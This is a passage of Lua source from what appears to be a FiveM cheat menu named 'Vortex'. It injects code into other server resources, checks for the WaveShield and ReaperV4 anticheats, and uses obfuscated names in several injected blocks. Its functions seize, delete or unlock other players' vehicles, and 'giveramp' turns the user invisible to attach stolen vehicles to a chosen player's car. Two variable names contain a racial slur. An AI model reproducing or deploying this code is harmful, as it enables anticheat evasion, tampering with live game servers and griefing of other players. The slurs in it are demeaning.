                                _tick(AsDfGhJkLz(p, true))

                                Wait(0)
                            end
                        end)
                    end

                    OpAsDfGhJkLzXcVb()
                ]])
            end
        else
            vortex_forceVehicleEngineEnabled = false
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
            return
        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                    GhYtReFdCxWaQzLp = false
                    local v = GetVehiclePedIsIn(PlayerPedId(), false)
                    if v and v ~= 0 then
                        SetVehicleKeepEngineOnWhenAbandoned(v, false)
                        SetVehicleEngineCanDegrade(v, true)
                        SetVehicleUndriveable(v, false)
                    end
                ]])
            end
        end
    end,

    maxupgrade = function()
        local WaveNiggaStarted = GetResourceState("WaveShield") == 'started'
        local ReaperNiggaStarted = GetResourceState("ReaperV4") == 'started'

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local script = [[
                local function XzPmLqRnWyBtVkGhQe()
                    local FnUhIpOyLkTrEzSd = PlayerPedId
                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                    local QwErTyUiOpAsDfGh = SetVehicleMod
                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                    for XyZoPqRtWnEsDfGh = 0, 16 do
                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                        end
                    end

                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                    end

                    for QeTrBnMkOjHuYgFv = 17, 22 do
                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                    end

                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                    for TpYuIoPlMnBvCxZq = 1, 12 do
                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                        end
                    end

                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                end

                XzPmLqRnWyBtVkGhQe()
            ]]

            if WaveNiggaStarted then
                Susano.InjectResource("any", script)
            elseif ReaperNiggaStarted then

                Susano.InjectResource("any", script)
            else
                Susano.InjectResource("any", script)
            end
        end
    end,

    deletevehicle = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleHasBeenOwnedByPlayer", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local veh = GetVehiclePedIsIn(ped, false)

                if veh and veh ~= 0 and DoesEntityExist(veh) then
                    SetVehicleHasBeenOwnedByPlayer(veh, true)
                    SetEntityAsMissionEntity(veh, true, true)

                    if NetworkHasControlOfEntity(veh) then
                        DeleteEntity(veh)
                        DeleteVehicle(veh)
                        end
                    end
            ]])
        end
    end,

    unlockclosestvehicle = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDoorsLocked", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDoorsLockedForAllPlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleHasBeenOwnedByPlayer", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)

                if veh and DoesEntityExist(veh) and NetworkHasControlOfEntity(veh) then
                    SetEntityAsMissionEntity(veh, true, true)
                    SetVehicleHasBeenOwnedByPlayer(veh, true)
                    SetVehicleDoorsLocked(veh, 1)
                    SetVehicleDoorsLockedForAllPlayers(veh, false)
                end
            ]])
        end
    end,

    teleportintoclosestvehicle = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                local function uPKcoBaEHmnK()
                    local ziCFzHyzxaLX = SetPedIntoVehicle
                    local YPPvDlOGBghA = GetClosestVehicle

                    local Coords = GetEntityCoords(PlayerPedId())
                    local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                    if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                        if GetPedInVehicleSeat(vehicle, -1) == 0 then
                            ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                        else
                            ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                        end
                    end
                end

                uPKcoBaEHmnK()
            ]])
        end
    end,

    detachallentitys = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                hNative("DetachEntity", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                ClearPedTasks(ped)
                DetachEntity(ped, true, true)
            ]])
        end
    end,

    boostvehicle = function()
        vortex_boostVehicleEnabled = not vortex_boostVehicleEnabled

            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)

                if not _G.vortex_boostVehicleEnabled then
                    _G.vortex_boostVehicleEnabled = false
                end
                _G.vortex_boostVehicleEnabled = %s

                if _G.vortex_boostVehicleEnabled then
                    CreateThread(function()
                        while _G.vortex_boostVehicleEnabled do
                            Wait(0)

                            local ped = PlayerPedId()
                            if IsControlPressed(0, 209) and IsPedInAnyVehicle(ped, false) then
                                local veh = GetVehiclePedIsIn(ped, false)
                                        if veh and veh ~= 0 then
                                    SetVehicleForwardSpeed(veh, 100.0)
                                        end
                                    end
                                end
                            end)
                        end
            ]], tostring(vortex_boostVehicleEnabled)))
        else
            if vortex_boostVehicleEnabled then
                vortex_boostVehicleEnabled = true
            else
                vortex_boostVehicleEnabled = false
            end
        end
    end,

    rampvehicle = function()
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityForwardVector", function(originalFn, ...) return originalFn(...) end)
                hNative("AttachEntityToEntity", function(originalFn, ...) return originalFn(...) end)

                local playerPed = PlayerPedId()
                if not IsPedInAnyVehicle(playerPed, false) then
                    return
                end

                local myVehicle = GetVehiclePedIsIn(playerPed, false)
                if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
                    return
                end

                CreateThread(function()
            local myCoords = GetEntityCoords(myVehicle)
            local myHeading = GetEntityHeading(myVehicle)
            local vehicles = {}
            local searchRadius = 100.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end
                success, veh = FindNextVehicle(vehHandle)
            until not success
            EndFindVehicle(vehHandle)

            if #vehicles < 3 then
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

                    local function takeControl(veh)
                        SetPedIntoVehicle(playerPed, veh, -1)
                        Wait(150)
                        SetEntityAsMissionEntity(veh, true, true)
                        if NetworkGetEntityIsNetworked(veh) then
                            NetworkRequestControlOfEntity(veh)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                                NetworkRequestControlOfEntity(veh)
                                Wait(10)
                                timeout = timeout + 1
                            end
                        end
                    end

                    for i = 1, 3 do
                        if DoesEntityExist(selectedVehicles[i]) then
                            takeControl(selectedVehicles[i])
                        end
                    end

                    SetPedIntoVehicle(playerPed, myVehicle, -1)
                    Wait(100)

                    local heading = GetEntityHeading(myVehicle)
                    local forwardVector = GetEntityForwardVector(myVehicle)
                    local vehCoords = GetEntityCoords(myVehicle)
                    local rampPositions = {
                        {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                        {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                        {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                    }

                    for i = 1, 3 do
                        if DoesEntityExist(selectedVehicles[i]) then
                            local pos = rampPositions[i]
                            AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                        end
                    end
                end)
            ]])
        else
        local playerPed = PlayerPedId()
        if not IsPedInAnyVehicle(playerPed, false) then
            return
        end

        local myVehicle = GetVehiclePedIsIn(playerPed, false)
        if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
            return
        end

        Citizen.CreateThread(function()
            local myCoords = GetEntityCoords(myVehicle)
            local myHeading = GetEntityHeading(myVehicle)
            local vehicles = {}
            local searchRadius = 100.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end
                success, veh = FindNextVehicle(vehHandle)
            until not success
            EndFindVehicle(vehHandle)

            if #vehicles < 3 then
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

            local function takeControl(veh)
                SetPedIntoVehicle(playerPed, veh, -1)
                Citizen.Wait(150)
                SetEntityAsMissionEntity(veh, true, true)
                if NetworkGetEntityIsNetworked(veh) then
                    NetworkRequestControlOfEntity(veh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                        NetworkRequestControlOfEntity(veh)
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                end
            end

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    takeControl(selectedVehicles[i])
                end
            end

            SetPedIntoVehicle(playerPed, myVehicle, -1)
            Citizen.Wait(100)

            local heading = GetEntityHeading(myVehicle)
            local forwardVector = GetEntityForwardVector(myVehicle)
            local vehCoords = GetEntityCoords(myVehicle)
            local rampPositions = {
                {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
            }

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    local pos = rampPositions[i]
                    AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                end
            end
        end)
        end
    end,

    giveramp = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamActive", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityModel", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestModel", function(originalFn, ...) return originalFn(...) end)
                hNative("HasModelLoaded", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("CreatePed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetBlockingOfNonTemporaryEvents", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                hNative("ClonePedToTarget", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityLocallyInvisible", function(originalFn, ...) return originalFn(...) end)
                hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("AttachEntityToEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetModelAsNoLongerNeeded", function(originalFn, ...) return originalFn(...) end)

                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then
                    return
                end

                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then
                    return
                end

                if not IsPedInAnyVehicle(targetPed, false) then
                    return
                end

                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                if not DoesEntityExist(targetVehicle) then
                    return
                end

                CreateThread(function()
                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local myHeading = GetEntityHeading(playerPed)

                    local rampCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
                    local camCoords = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    SetCamCoord(rampCam, camCoords.x, camCoords.y, camCoords.z)
                    SetCamRot(rampCam, camRot.x, camRot.y, camRot.z, 2)
                    SetCamFov(rampCam, GetGameplayCamFov())
                    SetCamActive(rampCam, true)
                    RenderScriptCams(true, false, 0, true, true)

                    local playerModel = GetEntityModel(playerPed)
                    RequestModel(playerModel)
                    local timeout = 0
                    while not HasModelLoaded(playerModel) and timeout < 50 do
                        Wait(50)
                        timeout = timeout + 1
                    end

                    local groundZ = myCoords.z
                    local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
                    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
                    if hit then
                        groundZ = hitCoords.z
                    end

                    local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
                    SetEntityCollision(clonePed, false, false)
                    FreezeEntityPosition(clonePed, true)
                    SetEntityInvincible(clonePed, true)
                    SetBlockingOfNonTemporaryEvents(clonePed, true)
                    SetPedCanRagdoll(clonePed, false)
                    ClonePedToTarget(playerPed, clonePed)

                    SetEntityVisible(playerPed, false, false)

                    local targetCoords = GetEntityCoords(targetVehicle)
                    local vehicles = {}
                    local searchRadius = 100.0
                    local vehHandle, veh = FindFirstVehicle()
                    local success

                    repeat
                        local vehCoords = GetEntityCoords(veh)
                        local distance = #(targetCoords - vehCoords)
                        local vehClass = GetVehicleClass(veh)
                        if distance <= searchRadius and veh ~= targetVehicle and vehClass ~= 8 and vehClass ~= 13 then
                            table.insert(vehicles, {handle = veh, distance = distance})
                        end
                        success, veh = FindNextVehicle(vehHandle)
                    until not success
                    EndFindVehicle(vehHandle)

                    if #vehicles < 3 then
                        SetEntityVisible(playerPed, true, false)
                        SetCamActive(rampCam, false)
                        RenderScriptCams(false, false, 0, true, true)
                        DestroyCam(rampCam, true)
                        if DoesEntityExist(clonePed) then
                            DeleteEntity(clonePed)
                        end
                        SetModelAsNoLongerNeeded(playerModel)
                        return
                    end

                    table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

                    local function takeControl(veh)
                        SetPedIntoVehicle(playerPed, veh, -1)
                        Wait(150)
                        SetEntityAsMissionEntity(veh, true, true)
                        if NetworkGetEntityIsNetworked(veh) then
                            NetworkRequestControlOfEntity(veh)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                                NetworkRequestControlOfEntity(veh)
                                Wait(10)
                                timeout = timeout + 1
                            end
                        end
                        SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                        SetEntityHeading(playerPed, myHeading)
                        Wait(100)
                    end

                    for i = 1, 3 do
                        if DoesEntityExist(selectedVehicles[i]) then
                            takeControl(selectedVehicles[i])
                        end
                    end

                    local rampPositions = {
                        {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                        {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                        {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                    }

                    for i = 1, 3 do
                        if DoesEntityExist(selectedVehicles[i]) and DoesEntityExist(targetVehicle) then
                            local pos = rampPositions[i]
                            AttachEntityToEntity(selectedVehicles[i], targetVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                        end
                    end

                    Wait(500)
                    SetEntityVisible(playerPed, true, false)
                    SetCamActive(rampCam, false)
                    RenderScriptCams(false, false, 0, true, true)
                    DestroyCam(rampCam, true)
                    if DoesEntityExist(clonePed) then
                        DeleteEntity(clonePed)
                    end
                    SetModelAsNoLongerNeeded(playerModel)
                end)
            ]], targetServerId))
        else
        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        if not IsPedInAnyVehicle(targetPed, false) then
            return
        end

        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
        if not DoesEntityExist(targetVehicle) then
            return
        end

        Citizen.CreateThread(function()
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            local myHeading = GetEntityHeading(playerPed)

            local rampCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
            local camCoords = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            SetCamCoord(rampCam, camCoords.x, camCoords.y, camCoords.z)
            SetCamRot(rampCam, camRot.x, camRot.y, camRot.z, 2)
            SetCamFov(rampCam, GetGameplayCamFov())
            SetCamActive(rampCam, true)
            RenderScriptCams(true, false, 0, true, true)

            local playerModel = GetEntityModel(playerPed)
            RequestModel(playerModel)
            local timeout = 0
            while not HasModelLoaded(playerModel) and timeout < 50 do
                Citizen.Wait(50)
                timeout = timeout + 1
            end

            local groundZ = myCoords.z
            local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
            local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
            if hit then
                groundZ = hitCoords.z
            end

            local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
            SetEntityCollision(clonePed, false, false)
            FreezeEntityPosition(clonePed, true)
            SetEntityInvincible(clonePed, true)
            SetBlockingOfNonTemporaryEvents(clonePed, true)
            SetPedCanRagdoll(clonePed, false)
            ClonePedToTarget(playerPed, clonePed)

            SetEntityVisible(playerPed, false, false)
            SetEntityLocallyInvisible(playerPed)

            local targetCoords = GetEntityCoords(targetVehicle)
            local vehicles = {}
            local searchRadius = 100.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(targetCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= targetVehicle and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end
